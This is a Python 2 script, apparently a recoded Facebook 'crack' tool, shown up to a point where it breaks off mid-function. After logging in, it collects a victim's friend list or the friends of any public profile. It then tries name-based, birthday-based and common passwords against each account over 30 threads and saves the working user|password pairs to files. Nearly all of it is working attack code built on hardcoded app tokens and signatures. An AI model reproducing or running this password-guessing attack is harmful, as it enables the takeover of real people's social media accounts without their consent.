#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 vip.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
logo = """\033[94m-------------------------------------------------\033[96m
   ╱▔▔▔▔▔▔▔▔╲    
   \033[96m▏        ▕    \033[95m=>\033[93m Recode   : Muhammad Rizky
   \033[96m▏╭━╮  ╭━╮▕    \033[95m=>\033[93m Github   : Github.com/RKT1/vip
\033[96m╱▔╲╲╰━╯╱╲╰━╯╱╱▔╲ \033[95m=>\033[93m Facebook : Rizky.Rasata
\033[96m╲▂╲╲▏╮ ▔▔ ╭▕╲╲▂╱ \033[95m=>\033[93m Whatsapp : 089560xxxxx
\033[96m╱▔╲╲▏┣╋╋╋╋┫▕╲╲▔╲
╲▂╱ ╲▂▂▂▂▂▂╱ ╲▂╱
\033[94m-------------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m[\033[93m●\033[0m]\033[93m Sedang masuk\033[0m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []


def masuk():
	os.system('clear')
	print logo
	print "\033[92m1. \033[0mLogin via email/id fb"
	print "\033[92m2. \033[0mLogin via token fb "
	print "\033[92m3. \033[0mAmbil Token"
	print "\033[91m0. \033[0mKeluar"
	print
	msuk = raw_input("\033[93m︻デ═一▸ \033[91m:\033[92m ")
	if msuk =="":
		print"\033[0m[\033[91m!\033[0m]\033[0m Isi Yg Benar !"
		masuk()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="3":
		Ambil_Token()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0m[\033[91m!\033[0m]\033[0m Isi Yg Benar !"
		time.sleep(0.7)
		masuk()

######## TOKENZ ########
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[0m[\033[95m?\033[0m] Token : ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print "[\033[92m✓\033[0m] \033[92mLogin Berhasil "
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		time.sleep(1)
		menu()
	except KeyError:
		print "[!] Token salah !"
		time.sleep(1.7)
		masuk()

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print "\033[0m[\033[96m×\033[0m] LOGIN AKUN FACEBOOK ANDA \033[0m[\033[96m×\033[0m]"
		id = raw_input('[\033[95m+\033[0m] ID/Email =\033[92m ')
		pwd = getpass.getpass('\033[0m[\033[95m?\033[0m] Password =\033[92m')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[0m[\033[92m✓\033[0m]\033[92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[0m[\033[93m!\033[0m]\033[92m Sepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[0m[\033[91m!\033[0m]\033[91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
		if 'login' in url:
			print("\n\033[0m[\033[91m!\033[0m]\033[91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
			

def Ambil_Token():
	os.system("clear")
	print logo
	jalan("Install...")
        os.system ("cd token && npm install")
	jalan ("Mulai...")
	os.system (" npm start ")
	raw_input("\n[ Kembali ]")
	masuk()



			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[92m『"+nama+"』"
	print "\033[94m-------------------------------------------------"
	print "\033[92m1.\033[0m Crack id Indonesia "
	print "\033[92m2.\033[0m Crack id bangladesh "
	print "\033[92m3.\033[0m Crack id usa "
	print "\033[92m4.\033[0m Crack id search name \033[92m(Fast) "
	print "\033[91m0.\033[0m Logout            \n"
	pilih()
	
	
def pilih():
	unikers = raw_input("︻デ═一▸ : ")
	if unikers =="":
		print "[!] Isi yang benar"
		pilih()
	elif unikers =="1":
		indo()
	elif unikers =="2":
		bangla()
	elif unikers =="3":
		Usa()
	elif unikers =="4":
		cari()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "[!] Isi yang benar"
		pilih()
		
def bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[92m1. \033[0mCrack dari daftar teman"
	print "\033[92m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	pilih_bangla()

def pilih_bangla():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[92m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[92m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			bangla()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_bangla()
	
	
	print "\033[0m{\033[92m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[92m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[92m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n-----------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['last_name'] + '12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[92m[OK✓] ' + user + ' • ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[93m[CP+] ' + user + ' • ' + pass1
					cek = open("banglad.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[92m[OK✓] ' + user + ' • ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[93m[CP+] ' + user + ' • ' + pass2
							cek = open("banglad.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[92m[OK✓] ' + user + ' • ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[93m[CP+] ' + user + ' • ' + pass3
									cek = open("banglad.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = ('786786')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[92m[OK✓] ' + user + ' • ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[93m[CP+] ' + user + ' • ' + pass4
											cek = open("banglad.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[92m[OK✓] ' + user + ' • ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[93m[CP+] ' + user + ' • ' + pass5
													cek = open("banglad.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[92m[OK✓] ' + user + ' • ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[93m[CP+] ' + user + ' • ' + pass6
															cek = open("banglad.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[92m[OK✓] ' + user + ' • ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[93m[CP+] ' + user + ' • ' + pass7
																	cek = open("banglad.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = ('Bangladesh')
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[92m[OK✓] ' + user + ' • ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[93m[CP+] ' + user + ' • ' + pass8
																			cek = open("banglad.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																			
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[93mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[93m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] File tersimpan : banglad.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')
	
	##########INDONESIA#######
	
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[93m1. \033[0mCrack dari daftar teman"
	print "\033[93m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	pilih_indo()

def pilih_indo():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[93m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[93m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			indo()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_indo()
	
	
	print "\033[0m{\033[93m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[93m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[93m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[94m-------------------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[92m[Berhasil] ' + user + ' • ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass1
					cek = open("indo.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[92m[Berhasil] ' + user + ' • ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass2
							cek = open("indo.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[92m[Berhasil] ' + user + ' • ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass3
									cek = open("indo.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[92m[Berhasil] ' + user + ' • ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass4
											cek = open("indo.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[92m[Berhasil] ' + user + ' • ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass5
													cek = open("indo.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[92m[Berhasil] ' + user + ' • ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass6
															cek = open("indo.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Kontol'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[92m[Berhasil] ' + user + ' • ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass7
																	cek = open("indo.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Bangsat'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[92m[Berhasil] ' + user + ' • ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass8
																			cek = open("indo.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
														
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print '\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[91mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[91m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] File tersimpan : indo.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')


###################################################### 



 ############ USA #########
def Usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[94m1. \033[0mCrack dari daftar teman"
	print "\033[94m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	super_Usa()

def super_Usa():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		Usa()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[94m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[94m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			Usa()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_super()
	
	
	print "\033[0m{\033[94m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[94m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[94m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n-----------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[96m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass1
					cek = open("out/usa.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					lahir = b['birthday']
					pass2 = lahir.replace('/', '')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[96m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass2
							cek = open("out/usa.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[94m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass3
									cek = open("out/usa.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[94m[Cekpoint] ' + user + ' | ' + pass4
											cek = open("out/usa.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['last_name'] + '123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[94m[Cekpoint] ' + user + ' | ' + pass5
													cek = open("out/usa.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = ('Indiana')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
